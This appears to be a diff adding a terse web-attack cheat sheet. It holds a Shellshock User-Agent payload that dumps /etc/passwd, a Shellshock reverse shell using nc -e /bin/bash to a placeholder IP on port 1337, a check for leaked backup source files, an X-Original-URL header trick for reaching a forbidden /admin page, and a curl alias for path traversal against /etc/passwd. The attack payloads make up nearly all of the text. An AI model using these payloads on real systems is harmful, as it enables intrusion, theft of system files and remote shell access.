@@ -1,0 +1,18 @@
+User-Agent: () { :;}; echo $(</etc/passwd)
+() { :;}; /usr/bin/nc ip 1337 -e /bin/bash
+
+http://site.com/file.php
+response = nothing
+http://site.com/file.php~
+response = source
+
+GET /admin HTTP/1.1
+Host: http://site.com
+...
+Access is denied
+GET /test HTTP/1.1
+Host: http://site.com
+X-Original-URL: /admin
+HTTP/1.1 200 OK
+
+alias lfi="curl -H 'Accept: ../../../../../../../../../etc/passwd{{' "
